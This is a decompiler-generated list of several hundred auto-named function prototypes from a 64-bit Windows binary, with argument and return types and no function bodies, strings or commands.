__int64 __fastcall sub_13F150DD8(unsigned int);
char __fastcall sub_13F150DF0(int a1, unsigned int a2);
__int64 __fastcall sub_13F150E9C(__int64 *);
__int64 __fastcall sub_13F150F08(__int64, __int64, __int64, unsigned int);
__int64 __fastcall sub_13F150F6C(__int64, __int64, _DWORD *);
void __fastcall sub_13F150FD0(__int64);
__int64 __fastcall sub_13F15105C(__int64);
__int64 __fastcall sub_13F151060(__int64);
__int64 __fastcall sub_13F151064(__int64);
__int64 __fastcall sub_13F15115C(__int64, __int64);
__int64 __fastcall sub_13F1511FC(__int64);
__int64 __fastcall sub_13F151228(__int64);
double __fastcall sub_13F151264(double);
__int64 __fastcall sub_13F15128C(__int64, int, int, __int64);
double __fastcall sub_13F151300(__int64, int, int);
__m128 __fastcall sub_13F151470(__int64);
__int64 __fastcall sub_13F1514D0(_DWORD *, int);
__int64 __fastcall sub_13F151514(_DWORD *);
bool __fastcall sub_13F15155C(__int64, __int64);
__int64 __fastcall sub_13F151590(__int64, unsigned int);
__int64 __fastcall sub_13F1516B0(__int64, unsigned int, unsigned int, int, unsigned int);
__m128 __fastcall sub_13F15190C(__int64);
__int64 __fastcall sub_13F151960(__int64, __int64, __int64, _QWORD *);
__int64 __fastcall sub_13F151BF8(_QWORD *);
char *__fastcall sub_13F151C44(_DWORD *, __int64, unsigned int, char);
__int64 __fastcall sub_13F151D50(__int64, __int64);
__int64 __fastcall sub_13F151DF0(__int64, __int64);
__int64 __fastcall sub_13F151E48(__int64, _QWORD *, unsigned int);
__int64 __fastcall sub_13F151F48(_DWORD *, unsigned int);
__int64 __fastcall sub_13F151FD0(__int64, __int64);
__int64 __fastcall sub_13F15203C(__int64);
__int64 __fastcall sub_13F152110(__int64, __int64, unsigned int);
__int64 __fastcall sub_13F152180(_QWORD *, _QWORD *);
_QWORD *__fastcall sub_13F1522A8(__int64, __int64, unsigned int);
__int64 __fastcall sub_13F152304(__int64, __int64);
__int64 __fastcall sub_13F15235C(__int64, unsigned int, unsigned int, char);
__int64 __fastcall sub_13F152408(_QWORD *);
__int64 __fastcall sub_13F152430(__int64, __int64);
__int64 __fastcall sub_13F15252C(__int64, __int64);
__int64 __fastcall sub_13F1525F4(__int64);
__int64 __fastcall sub_13F152618(__int64);
__int64 __fastcall sub_13F152644(__int64, __int64);
__int64 __fastcall sub_13F1526AC(__int64, __int64);
__int64 __fastcall sub_13F152718(__int64, unsigned int, __int64, char);
__int64 __fastcall sub_13F152B08(__int64, __int64);
__int64 __fastcall sub_13F152B64(__int64, unsigned int, unsigned int, char);
__int64 __fastcall sub_13F152C10(__int64);
__int64 __fastcall sub_13F152CDC(__int64, __int64, unsigned int);
__int64 __fastcall sub_13F152DE0(__int64, _QWORD *);
__int64 __fastcall sub_13F152E3C(__int64, char);
char *__fastcall sub_13F152E4C(__int64, __int64, char);
__int64 __fastcall sub_13F152F60(__int64);
__int64 __fastcall sub_13F152F78(__int64, __int64, unsigned int);
__int64 __fastcall sub_13F152FB8(__int64, __int64);
__int64 sub_13F153000();
void sub_13F1536B4();
__int64 __fastcall sub_13F1537EC(unsigned int);
__int64 sub_13F153810();
__int64 __fastcall sub_13F15382C(__int64);
__int64 __fastcall sub_13F153868(__int64 *);
_QWORD *__fastcall sub_13F1538C0(_QWORD *, char);
_QWORD *__fastcall sub_13F1538EC(_QWORD *, char);
_QWORD *__fastcall sub_13F15392C(_QWORD *, char);
_QWORD *__fastcall sub_13F153958(_QWORD *, char);
_QWORD *__fastcall sub_13F153984(__int64, int);
_QWORD *__fastcall sub_13F153A04(__int64, __int64);
__int64 __fastcall sub_13F153A9C(__int64);
__int64 __fastcall sub_13F153AA0(__int64);
__int64 __fastcall sub_13F153AF8(__int64, __int64, int);
__int64 __fastcall sub_13F153B18(__int64, __int64);
char __fastcall sub_13F153BAC(_BYTE *, __int64);
__int64 __fastcall sub_13F153C8C(__int64);
__int64 __fastcall sub_13F153C9C(volatile signed __int32 *);
__int64 __fastcall sub_13F153CCC(__int64, unsigned int, unsigned int);
void __fastcall sub_13F153D80(__int64, __int64);
__int64 __fastcall sub_13F153D88(__int64);
__int64 __fastcall sub_13F153E04(_BYTE *);
unsigned __int64 *__fastcall sub_13F153E34(unsigned __int64 *);
__int64 __fastcall sub_13F153F54(int, __int64, __int64, __int64);
__int64 __fastcall sub_13F15401C(__int64, __int64);
char __fastcall sub_13F154068(__int64, __int64);
__int64 __fastcall sub_13F1540B4(__int64, __int64);
__int64 __fastcall sub_13F154100(__int64 *, __int64, __int64, unsigned int, __int64, __int64);
__int64 __fastcall sub_13F154188(__int64, __int64, __int64);
__int64 __fastcall sub_13F1541DC(__int64, __int64);
__int64 sub_13F154220();
void sub_13F1542E0();
__int64 __fastcall sub_13F15432C(__int64, __int64);
__int64 __fastcall sub_13F1543A8(__int64);
__int64 __fastcall sub_13F15441C(_QWORD *, __int64);
_QWORD *__fastcall sub_13F154478(_QWORD *, __int64);
__int64 __fastcall sub_13F1544AC(__int64, _BYTE *);
bool __fastcall sub_13F15450C(__int64 a1);
char __fastcall sub_13F154560(__int64);
char __fastcall sub_13F1545C4(__int64);
char __fastcall sub_13F1545CC(__int64, __int64, int, char);
__int64 __fastcall sub_13F154664(__int64);
__int64 __fastcall sub_13F15467C(__int64);
char __fastcall sub_13F154694(__int64, __int64, __int64, __int64);
char __fastcall sub_13F154764(unsigned int *, __int64);
__int64 __fastcall sub_13F154798(__int64);
__int64 __fastcall sub_13F1547C4(__int64, __int64, __int64);
__int64 __fastcall sub_13F154A10(__int64, unsigned int);
__int64 __fastcall sub_13F154AAC(__int64, unsigned int);
__int64 __fastcall sub_13F154B48(__int64, __int32, char);
char __fastcall sub_13F154BC8(_BYTE *);
signed __int64 __fastcall sub_13F154C44(__int64);
__int64 __fastcall sub_13F154C84(__int64);
char __fastcall sub_13F154D30(__int64, signed __int64, int, char);
char __fastcall sub_13F154E70(signed __int64);
char __fastcall sub_13F155054(__int64);
char __fastcall sub_13F155068(__int64, __int64, __int64);
void **sub_13F15514C();
__int64 __fastcall sub_13F1551E8(__int64, __int64);
__int64 *__fastcall sub_13F1551EC(__int64, char, char);
void __fastcall sub_13F1552A0(__int64);
__int64 __fastcall sub_13F155334(__int64, int *, int, __int64 *);
__int64 __fastcall sub_13F1553F8(__int64);
__int64 __fastcall sub_13F155520(__int64);
__int64 __fastcall sub_13F15555C(__int64, signed __int64);
signed __int64 __fastcall sub_13F1556DC(volatile signed __int32 **, __int64, char);
char __fastcall sub_13F155830(_QWORD **);
__int64 __fastcall sub_13F1558C4(__int64, __int64);
__int64 __fastcall sub_13F15595C(__int64, __int64);
char __fastcall sub_13F155A18(__int64, __int64, _DWORD *, int);
__int64 __fastcall sub_13F155B0C(int *, __int64);
__int64 __fastcall sub_13F155B54(int *, char);
__int64 __fastcall sub_13F155C60(__int64);
void __fastcall sub_13F155C80(__int64);
__int64 *__fastcall sub_13F155CBC(__int64);
__int64 *__fastcall sub_13F155CE4(__int64, __int64);
char __fastcall sub_13F155D58(__int64, _QWORD *);
char __fastcall sub_13F155D88(__int64, __int64);
__int64 __fastcall sub_13F155DD4(__int64);
unsigned __int64 *__fastcall sub_13F155E28(__int64);
__int64 __fastcall sub_13F155E78(__int64, __int64);
_QWORD *__fastcall sub_13F155F08(_QWORD *, __int64);
_QWORD *__fastcall sub_13F155F48(_QWORD *, __int64);
_QWORD *__fastcall sub_13F155F88(_QWORD *, __int64);
_QWORD *__fastcall sub_13F155FC8(_QWORD *, __int64);
void **__fastcall sub_13F156008(_QWORD *, __int64);
__int64 __fastcall sub_13F156044(); // weak
_QWORD *__fastcall sub_13F156060(__int64, __int64);
_QWORD *__fastcall sub_13F15606C(_QWORD *, __int64);
char __fastcall sub_13F1560A0(__int64, __int64);
__int64 *__fastcall sub_13F1562DC(__int64, __int64);
__int64 __fastcall sub_13F15634C(__int64);
char __fastcall sub_13F15651C(__int64);
void __fastcall sub_13F1565B0(__int64, __int64);
__int64 __fastcall sub_13F1565D4(__int64);
__int64 __fastcall sub_13F1565FC(__int64);
void __fastcall sub_13F1567C8(__int64, __int64);
char __fastcall sub_13F156820(__int64);
__int64 __fastcall sub_13F1568B0(_QWORD *, bool *, bool *);
__int64 __fastcall sub_13F156A30(__int64, __int64);
signed __int64 __fastcall sub_13F156A70(__int64, signed __int64);
__int64 __fastcall sub_13F156A98(__int64);
__int64 __fastcall sub_13F156AA4(__int64);
__int64 __fastcall sub_13F156AAC(__int64);
__int64 __fastcall sub_13F156AC0(__int64);
__int64 __fastcall sub_13F156B08(int *, __int64, __int64);
bool __fastcall sub_13F156CC8(__int64);
char __fastcall sub_13F156CD4(__int64);
__int64 __fastcall sub_13F156D44(__int64);
char __fastcall sub_13F156E7C(__int64, char);
void __fastcall sub_13F156F18(__int64, __int64, __int64, char);
__int64 __fastcall sub_13F156F6C(__int64, __int64);
void __fastcall sub_13F156F7C(__int64);
__int64 __fastcall sub_13F156FE4(__int64);
void __fastcall sub_13F15701C(__int64, __int64);
void __fastcall sub_13F157050(__int64, __int64);
__int64 __fastcall sub_13F157088(__int64);
__int64 __fastcall sub_13F1570C0(__int64);
void __fastcall sub_13F1571C4(__int64, __int64, char);
char __fastcall sub_13F157284(__int64, int);
__int64 __fastcall sub_13F157404(__int64, __int64, int);
__int64 __fastcall sub_13F1575D4(__int64);
__int64 __fastcall sub_13F157714(__int64);
char __fastcall sub_13F157868(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F1578DC(__int64);
__int64 __fastcall sub_13F157ACC(__int64, __int64, int);
__int64 __fastcall sub_13F157B8C(__int64);
__int64 __fastcall sub_13F157CB4(__int64);
__int64 __fastcall sub_13F157CDC(__int64);
char __fastcall sub_13F157CE8(__int64);
char __fastcall sub_13F157D4C(__int64);
char __fastcall sub_13F157D54(__int64, signed __int64, int, char);
char __fastcall sub_13F157E94(__int64, signed __int64);
__int64 __fastcall sub_13F157EC4(__int64, __int64, __int64, char, unsigned int);
__int64 __fastcall sub_13F157F88(__int64, __int64, __int64);
__int64 __fastcall sub_13F15801C(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F158124(__int64, __int64, int *, unsigned int, int);
__int64 __fastcall sub_13F1581AC(__int64);
__int64 __fastcall sub_13F1582A0(__int64);
__int64 __fastcall sub_13F15845C(__int64, __int64);
__int64 __fastcall sub_13F1584D0(signed __int64);
signed __int64 __fastcall sub_13F158554(signed __int64, char);
__int64 __fastcall sub_13F158588(__int64, _DWORD *);
__int64 __fastcall sub_13F158704(__int64, signed __int64);
char __fastcall sub_13F158884(_QWORD *, __int64, __int64);
char __fastcall sub_13F1589C0(__int64);
signed __int64 __fastcall sub_13F158A14(__int64, _DWORD *, __int64);
__int64 __fastcall sub_13F158B04(__int64);
char __fastcall sub_13F158B94(__int64, _QWORD *);
__int64 __fastcall sub_13F158C84(__int64, __int64);
__int64 __fastcall sub_13F158D14(__int64, __int64, __int64);
__int64 __fastcall sub_13F158D8C(__int64);
__int64 __fastcall sub_13F158E98(__int64, __int64, char);
__int64 __fastcall sub_13F158EF8(__int64);
bool __fastcall sub_13F158F64(__int64);
bool __fastcall sub_13F158F70(__int64);
__int64 __fastcall sub_13F158F84(__int64, __int64);
__int64 __fastcall sub_13F158FC0(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F1590E0(__int64, unsigned int, char);
signed __int64 __fastcall sub_13F159198(__int64, int *, char);
__int64 __fastcall sub_13F159318(__int64);
void __fastcall sub_13F159414(__int64, __int64);
char __fastcall sub_13F15944C(__int64, signed __int64, int, char);
char __fastcall sub_13F15958C(signed __int64);
char __fastcall sub_13F1595C0(__int64);
char __fastcall sub_13F15961C(__int64, signed __int64);
char __fastcall sub_13F159678(__int64, int *);
__int64 __fastcall sub_13F1596D8(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F159714(__int64, __int64, __int64);
__int64 __fastcall sub_13F159750(__int64, __int64, __int64);
__int64 __fastcall sub_13F1598F8(__int64, char);
__int64 __fastcall sub_13F159C44(int *, __int64, __int64);
__int64 __fastcall sub_13F159CE8(__int64, __int64);
__int64 __fastcall sub_13F159D4C(__int64, __int64, __int64);
__int64 __fastcall sub_13F159DDC(__int64, __int64, __int64, __int64, __int64 *);
signed __int64 __fastcall sub_13F159E24(signed __int64);
__int64 __fastcall sub_13F159E88(__int64, __int64);
__int64 __fastcall sub_13F159F30(__int64, __int64, __int64);
signed __int64 __fastcall sub_13F159F64(__int64, __int64, char);
_QWORD *__fastcall sub_13F15A004(_QWORD *, __int64, char);
void **__fastcall sub_13F15A0C4(_QWORD *, __int64);
_QWORD *__fastcall sub_13F15A0F4(_QWORD *, __int64);
__int64 *__fastcall sub_13F15A128(__int64, __int64);
__int64 __fastcall sub_13F15A178(__int64);
__int64 __fastcall sub_13F15A1F4(_QWORD *, __int64);
char __fastcall sub_13F15A25C(__int64, __int64);
__int64 __fastcall sub_13F15A2AC(); // weak
__int64 __fastcall sub_13F15A2B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_13F15A2E4(__int64);
bool __fastcall sub_13F15A310(__int64);
__int64 __fastcall sub_13F15A31C(__int64, char);
__int64 __fastcall sub_13F15A358(__int64, char);
void __fastcall sub_13F15A488(__int64, __int64);
__int64 __fastcall sub_13F15A4C8(__int64);
__int64 __fastcall sub_13F15A58C(__int64);
_QWORD *__fastcall sub_13F15A5D8(_QWORD *, _OWORD **);
_QWORD *__fastcall sub_13F15A61C(__int64, __int64);
_QWORD *__fastcall sub_13F15A628(__int64, __int64);
_QWORD *__fastcall sub_13F15A634(_QWORD *, __int64);
_QWORD *__fastcall sub_13F15A680(_QWORD *, __int64);
signed __int64 __fastcall sub_13F15A6CC(__int64, _QWORD *, unsigned int);
_QWORD *__fastcall sub_13F15A6D8(_OWORD **);
_QWORD *__fastcall sub_13F15A714(__int64);
_QWORD *__fastcall sub_13F15A780(__int64, __int64, __int64);
__int64 __fastcall sub_13F15A7CC(__int64);
__int64 __fastcall sub_13F15A7D4(__int64);
__int64 *__fastcall sub_13F15A7E8(__int64, __int64 *);
__int64 *__fastcall sub_13F15A804(__int64, __int64 *);
__int64 sub_13F15A828();
__int64 sub_13F15A874();
_QWORD *__fastcall sub_13F15A890(_QWORD *, _QWORD *);
signed __int64 __fastcall sub_13F15A8B4(__int64, __int64);
__int64 __fastcall sub_13F15A8EC(__int64, unsigned __int64 *);
char __fastcall sub_13F15A918(__int64);
signed __int64 __fastcall sub_13F15A938(__int64);
void __fastcall sub_13F15A9D4(__int64);
void __fastcall __noreturn sub_13F15AA5C(__int64);
void __fastcall __noreturn sub_13F15AA68(__int64);
__int64 __fastcall sub_13F15AA80(__int64, __int64);
__int64 __fastcall sub_13F15AAF8(__int64);
__int64 __fastcall sub_13F15AB70(__int64, __int64);
__int64 __fastcall sub_13F15AB98(__int64);
__int64 __fastcall sub_13F15AC04(__int64, __int64);
__int64 __fastcall sub_13F15AC2C(__int64 a1);
char __fastcall sub_13F15AC3C(signed __int64 a1);
__int64 __fastcall sub_13F15AC4C(__int64, char);
__int64 __fastcall sub_13F15ACA8(__int64, unsigned __int8 (__fastcall *)(_QWORD, __int64), __int64, unsigned __int8 (__fastcall *)(__int64, __int64));
__int64 __fastcall sub_13F15AD88(__int64, char, _BYTE *);
__int64 __fastcall sub_13F15ADF4(__int64, char);
__int64 __fastcall sub_13F15AF18(__int64, char);
void __fastcall sub_13F15B028(__int64);
__int64 __fastcall sub_13F15B058(__int64 (__fastcall ***)(_QWORD, __int64));
void __fastcall sub_13F15B06C(__int64, __int64);
void __fastcall sub_13F15B084(__int64, __int64);
void __fastcall sub_13F15B0C8(__int64, __int64);
void __fastcall sub_13F15B180(__int64, char);
__int64 __fastcall sub_13F15B184(__int64);
__int64 __fastcall sub_13F15B338(__int64, __int64, __int64, unsigned int);
_QWORD *__fastcall sub_13F15B390(_QWORD *, char);
__int64 __fastcall sub_13F15B3C8(__int64);
__int64 __fastcall sub_13F15B3D4(__int64);
__int64 __fastcall sub_13F15B3D8(__int64);
__int64 __fastcall sub_13F15B3DC(__int64);
__int64 __fastcall sub_13F15B3E0(__int64, __int64);
__int64 __fastcall sub_13F15B450(__int64);
__int64 __fastcall sub_13F15B474(__int64);
__int64 __fastcall sub_13F15B484(__int64);
_QWORD *__fastcall sub_13F15B494(_QWORD *, __int64, __int64, unsigned int);
_QWORD *__fastcall sub_13F15B4CC(_QWORD *, char);
void __fastcall sub_13F15B504(__int64, __int64);
__int64 __fastcall sub_13F15B62C(__int64, __int64);
char __fastcall sub_13F15B6DC(__int64, __int64);
__int64 __fastcall sub_13F15B7F8(_QWORD *);
__int64 __fastcall sub_13F15B890(__int64, __int64);
__int64 __fastcall sub_13F15B934(__int64, unsigned int);
__int64 __fastcall sub_13F15B9FC(__int64, __int64);
__int64 __fastcall sub_13F15BA18(__int64);
__int64 __fastcall sub_13F15BADC(__int64);
__int64 __fastcall sub_13F15BAF8(__int64, unsigned int);
void __fastcall sub_13F15BB50(__int64, __int64, int);
__int64 __fastcall sub_13F15BC34(__int64, __int64, int);
__int64 __fastcall sub_13F15BD18(__int64, __int64);
__int64 __fastcall sub_13F15BD70(__int64);
__int64 __fastcall sub_13F15BDBC(__int64, char);
void __fastcall sub_13F15BDF0(__int64);
__int64 __fastcall sub_13F15BE04(__int64);
void sub_13F15BE08();
__int64 __fastcall sub_13F15BE14(__int64, int);
__int64 __fastcall sub_13F15BE20(__int64);
__int64 __fastcall sub_13F15BE58(__int64);
__int64 __fastcall sub_13F15BE84(__int64);
__int64 __fastcall sub_13F15BED8(__int64, int, int, int, __int64);
bool __fastcall sub_13F15BEFC(__int64 a1, _DWORD *a2);
bool __fastcall sub_13F15BF9C(__int64 a1, _DWORD *a2);
__int64 __fastcall sub_13F15BFE4(__int64, __int64);
__int64 __fastcall sub_13F15C01C(__int64);
void __fastcall sub_13F15C078(__int64, __int64);
char __fastcall sub_13F15C0C0(__int64, __int64, __int64, char);
__int64 __fastcall sub_13F15C17C(__int64, _DWORD *);
__int64 __fastcall sub_13F15C1E8(__int64, _DWORD *);
char __fastcall sub_13F15C258(__int64, __int64, __int64, char);
char __fastcall sub_13F15C2C4(_QWORD *, __int64, __int64, char, int, char);
char __fastcall sub_13F15C394(__int64, __int64, __int64);
char __fastcall sub_13F15C3D8(_QWORD *, __int64, __int64, int, char);
char __fastcall sub_13F15C494(__int64, __int64, __int64, char, char);
char __fastcall sub_13F15C508(_QWORD *, __int64, __int64, char, int, char);
__int64 __fastcall sub_13F15C5E0(__int64);
char __fastcall sub_13F15C630(_QWORD *, __int64);
bool __fastcall sub_13F15C674(__int64, __int64, __int64, char, char);
bool __fastcall sub_13F15C718(__int64, __int64, __int64, char, char);
void *__fastcall sub_13F15C7A8(__int64, __int64, int);
bool __fastcall sub_13F15C81C(__int64);
char __fastcall sub_13F15C8B0(__int64 a1, __int64 a2, __int64 a3, char a4, int a5);
char __fastcall sub_13F15CCC0(__int64 *a1, __int64 a2, __int64 a3, char a4, int a5);
char __fastcall sub_13F15D008(__int64 a1, __int64 a2, _DWORD *a3, __int64 a4, char a5, int a6, __int64 a7, char a8);
char __fastcall sub_13F15D1C4(__int64 a1, __int64 a2, _DWORD *a3, __int64 a4, char a5, int a6, __int64 a7, char a8);
char __fastcall sub_13F15D3A0(__int64 a1, __int64 a2, _DWORD *a3, __int64 a4, char a5, int a6, __int64 a7, char a8);
char __fastcall sub_13F15D574(_QWORD *, __int64, __int64, __int64, char);
char __fastcall sub_13F15D6D0(_QWORD *, __int64, __int64, __int64, char);
char __fastcall sub_13F15D820(__int64, __int64, __int64, char);
char __fastcall sub_13F15D8F0(__int64, __int64, __int64);
char __fastcall sub_13F15D998(__int64, __int64, __int64, char);
char __fastcall sub_13F15DA6C(_QWORD *a1, __int64 a2, __int64 a3, int a4, char a5);
char __fastcall sub_13F15DB44(__int64, __int64, __int64);
char __fastcall sub_13F15DC1C(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F15DCE0(__int64);
void __fastcall sub_13F15DD44(__int64, __int64);
__int64 __fastcall sub_13F15DDD4(__int64);
_QWORD *__fastcall sub_13F15DDE4(_QWORD *, __int64, __int64);
_QWORD *__fastcall sub_13F15DE3C(_QWORD *, __int64);
__int64 __fastcall sub_13F15DE7C(unsigned int *, __int64, __int64);
__int64 __fastcall sub_13F15DED0(__int64, int);
bool __fastcall sub_13F15DF28(unsigned __int64 *, __int64);
__int64 __fastcall sub_13F15DF54(_QWORD *, unsigned __int64 *, __int64);
_QWORD *__fastcall sub_13F15DFB8(_QWORD *, unsigned __int64 *, __int64, _QWORD *);
_OWORD *__fastcall sub_13F15E084(_OWORD *, __int64 *, int);
__int64 __fastcall sub_13F15E1E0(__int64 *, __int64, __int64, __int64, __int64, __int64, int, int, int, __int64 *, unsigned __int8);
_QWORD *__fastcall sub_13F15E304(_QWORD *, __int64);
__int64 __fastcall sub_13F15E340(__int64);
__int64 sub_13F15E394();
__int64 sub_13F15E3A8();
__int64 __fastcall sub_13F15E3BC(__int64);
__int64 __fastcall sub_13F15E3D4(__int64);
__int64 __fastcall sub_13F15E46C(__int64, __int64);
__int64 __fastcall sub_13F15E4FC(__int64);
__int64 __fastcall sub_13F15E524(_QWORD); // weak
__int64 __fastcall sub_13F15E52C(__int64, __int64);
signed __int64 __fastcall sub_13F15E554(__int64, __int64);
void __fastcall __noreturn sub_13F15E670(); // weak
void __fastcall sub_13F15E6A0(__int64);
void __fastcall _CallMemberFunction0(void *const, void *const); // idb
__int64 __fastcall sub_13F15E718(__int64);
__int64 __fastcall sub_13F15E748(__int64, int *);
__int64 __fastcall sub_13F15E76C(_DWORD **);
__int64 sub_13F15E7B8();
__int64 sub_13F15E7CC();
const __m128i *__fastcall sub_13F15E7EC(const __m128i *, const __m128i *);
__int64 __fastcall sub_13F15E9EC(); // weak
// void __stdcall __noreturn CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
__int64 __fastcall sub_13F15EAE0(void *, __int64, unsigned __int64);
__m128i *__fastcall sub_13F15EB00(__m128i *a1, const __m128i *a2, unsigned __int64 a3);
__int64 __fastcall sub_13F15EF50(void *, char, unsigned __int64);
__int64 __fastcall sub_13F15EF70(__int64, unsigned __int8, unsigned __int64);
__int64 __fastcall sub_13F15F110(unsigned __int64 *, __int64, unsigned __int64);
_QWORD *__fastcall sub_13F15F1D8(_QWORD *, __int64);
_QWORD *__fastcall sub_13F15F218(_QWORD *, __int64);
__int64 __fastcall sub_13F15F258(__int64, __int64, __int64, __int64, __int64, __int64);
int *__fastcall sub_13F15F3E0(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F15F51C(__int64, __int64, __int64, __int64, __int64, __int64);
_QWORD *__fastcall sub_13F15F73C(_QWORD *, __int64);
_QWORD *__fastcall sub_13F15F754(_QWORD *, __int64);
char *__fastcall sub_13F15F76C(_QWORD *a1, int a2, __int64 a3, __int64 a4, int a5);
__int64 __fastcall sub_13F15F8F0(const __m128i *, unsigned int, unsigned __int64);
char sub_13F15F960();
char __fastcall sub_13F15F994(char);
bool sub_13F15FBC0();
__int64 *__fastcall sub_13F15FBE0(__int64 *);
__int64 sub_13F15FC00();
__int64 sub_13F15FC1C();
__int64 sub_13F15FCE8();
char sub_13F15FD38();
char sub_13F15FD8C();
__int64 __fastcall sub_13F15FDB0(_QWORD *, unsigned __int64 *, __int64);
__int64 __fastcall sub_13F15FDD8(_QWORD *, unsigned __int64 *, __int64);
__int64 __fastcall sub_13F15FE04(__int64 *, __int64, int);
__int64 __fastcall sub_13F15FE10(_QWORD *, unsigned __int64 *, __int64, int);
__int64 __fastcall sub_13F15FE4C(__int64, unsigned __int64 *);
__int64 __fastcall sub_13F15FE54(__int64, __int64, unsigned __int64);
__int64 __fastcall sub_13F15FEBC(__int64, __m128i *, int *, __int64);
__int64 __fastcall sub_13F1600BC(__int64, __m128i *, int *, __int64);
__int64 __fastcall sub_13F16017C(__int64, __int64 *, __int64, unsigned __int64 *, __int64, int *, __int64, int *, int, int, int, unsigned __int8);
__int64 __fastcall sub_13F16024C(__int64, __int64 *, __int64, unsigned __int64 *, _DWORD *, unsigned __int8, int, __int64);
void __fastcall sub_13F1606B0(_DWORD *, __int64 *, __int64, unsigned __int64 *, __int64, int, int, __int64);
__int64 __fastcall sub_13F1608E0(__int64, __int64, _BYTE *);
__int64 __fastcall sub_13F160A24(__int64, __int64 *, __int64, unsigned __int64 *, __int64, int, __int64, unsigned __int8);
_QWORD *__fastcall sub_13F160C6C(_QWORD *, __int64);
_QWORD *__fastcall sub_13F160CAC(_QWORD *);
__int64 __fastcall sub_13F160CCC(_QWORD *);
__int64 __fastcall sub_13F160EB8(__int64 *, __int64, _DWORD *);
__int64 __fastcall sub_13F160F40(__int64 *, unsigned __int64 *, __int64, int);
__int64 __fastcall sub_13F1610D4(_QWORD *, unsigned __int64 *, __int64);
char __fastcall sub_13F16116C(__int64, _DWORD *);
char __fastcall sub_13F161244(int *);
__int64 __fastcall sub_13F1612D8(__int64, __int64 (__fastcall *)(__int64, __int64), __int64);
__int64 __fastcall sub_13F1612E4(__int64, __int64 (__fastcall *)(__int64, __int64, _QWORD), __int64, unsigned int);
__int64 __fastcall sub_13F1612F4(__int64, char **, char);
__int64 __fastcall sub_13F1613C0(__int64, __int64);
__int64 __fastcall sub_13F161444(__int64, char *);
__int64 __fastcall sub_13F161484(__int64, __int64);
__int64 __fastcall sub_13F16152C(__int64, unsigned __int64);
__int64 __fastcall sub_13F1615B4(__int64, __int64, unsigned int);
__int64 __fastcall sub_13F161644(__int64, char *);
__int64 __fastcall sub_13F16167C(signed int *, __int64, signed int);
__int64 __fastcall sub_13F1616BC(__int64, __int64, __int64);
__int64 __fastcall sub_13F1616E8(__int64, __int64, char);
__int64 __fastcall sub_13F161714(__int64, __int64, char *);
__int64 __fastcall sub_13F161740(__int64, __int64, unsigned int);
__int64 __fastcall sub_13F16176C(__int64, __int64);
__int64 __fastcall sub_13F1617B0(__int64, char);
__int64 __fastcall sub_13F161830(__int64, char *);
__int64 __fastcall sub_13F1618BC(__int64, unsigned int);
int *__fastcall sub_13F161928(int *, __int64);
void __fastcall sub_13F161990(__int64 *, __int64);
__int64 __fastcall sub_13F1619F4(__int64, __int64);
void __fastcall sub_13F1627A8(__int64, char *, unsigned int);
__int64 __fastcall sub_13F162850(__int64);
__int64 __fastcall sub_13F16297C(__int64);
__int64 __fastcall sub_13F162A70(__int64, __int64);
__int64 __fastcall sub_13F162CC4(__int64);
__int64 __fastcall sub_13F162D8C(__int64, __int64);
__int64 __fastcall sub_13F1631F4(__int64);
__int64 __fastcall sub_13F163334(__int64, __int64, char *, _QWORD *, int);
__int64 __fastcall sub_13F163AEC(__int64, __int64);
__int64 __fastcall sub_13F163BD4(__int64);
__int64 __fastcall sub_13F163E7C(__int64, char);
__int64 __fastcall sub_13F163FF8(__int64);
__int64 __fastcall sub_13F164044(__int64);
__int64 __fastcall sub_13F1641A4(__int64);
__int64 __fastcall sub_13F1642A0(__int64, char **, _BYTE *, int);
__int64 __fastcall sub_13F1644B4(__int64, __int64);
__int64 __fastcall sub_13F16457C(__int64, __int64);
char __fastcall sub_13F164AD4(__int64);
char __fastcall sub_13F164AE0(__int64);
__int64 __fastcall sub_13F164AE4(__int64);
__int64 __fastcall sub_13F164B10(__int64);
char __fastcall sub_13F164B48(__int64);
__int64 __fastcall sub_13F164B5C(__int64);
__int64 __fastcall sub_13F164BD0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_13F164C7C(__int64);
__int64 sub_13F164CC4();
__int64 __fastcall sub_13F164D38(__int64, char, _BYTE *);
__int64 __fastcall sub_13F1654A8(__int64, __int64);
__int64 __fastcall sub_13F1656F8(__int64, __int64, int);
__int64 __fastcall sub_13F16585C(__int64, _QWORD *, __int64, char *);
__int64 __fastcall sub_13F165994(__int64);
__int64 __fastcall sub_13F165AD4(__int64, __int64);
__int64 __fastcall sub_13F165B08(__int64);
__int64 __fastcall sub_13F165F80(__int64);
__int64 __fastcall sub_13F166084(__int64);
__int64 __fastcall sub_13F166118(_QWORD *a1, _BYTE *a2, int a3);
_BYTE *__fastcall sub_13F1661AC(__int64, _BYTE *, int);
_BYTE *__fastcall sub_13F1661F4(__int64, _BYTE *, unsigned __int64);
__int64 __fastcall sub_13F166208(__int64, __int64);
unsigned __int64 __fastcall sub_13F166238(__int64, __int64, unsigned __int64);
_BYTE *__fastcall sub_13F166284(__int64, _BYTE *, int);
__int64 __fastcall sub_13F1662BC(__int64, char *);
__int64 __fastcall sub_13F16638C(__int64);
__int64 __fastcall sub_13F1663D8(__int64);
__int64 __fastcall sub_13F1666F4(__int64);
__int64 __fastcall sub_13F166A94(__int64, char);
__int64 __fastcall sub_13F166C90(__int64);
int sub_13F166CB4();
char *__fastcall sub_13F167014(__int64, char *, int);
__int64 __fastcall sub_13F167120(__int64, __int64);
__int64 __fastcall sub_13F167320(__int64, char, char);
__int64 __fastcall sub_13F1675FC(__int64);
__int64 __fastcall sub_13F167600(__int64);
__int64 __fastcall sub_13F167628(__int64);
__int64 __fastcall sub_13F16767C(__int64);
__int64 __fastcall sub_13F167680(__int64);
char *__fastcall sub_13F167778(char *, char *, int, __int64 (__fastcall *)(), __int64 (__fastcall *)(_QWORD), unsigned __int16);
char *__fastcall sub_13F1677A0(char *, char *, int, __int64 (__fastcall *)(), __int64 (__fastcall *)(_QWORD), __int64, int);
uintptr_t sub_13F1678D4();
char sub_13F1678E4();
void sub_13F16792C();
char sub_13F167948();
void sub_13F167980();
__int64 __fastcall sub_13F16799C(unsigned int, __int64, unsigned int *, unsigned int *);
__int64 __fastcall sub_13F167B74(__int64);
__int64 __fastcall sub_13F167BBC(unsigned int);
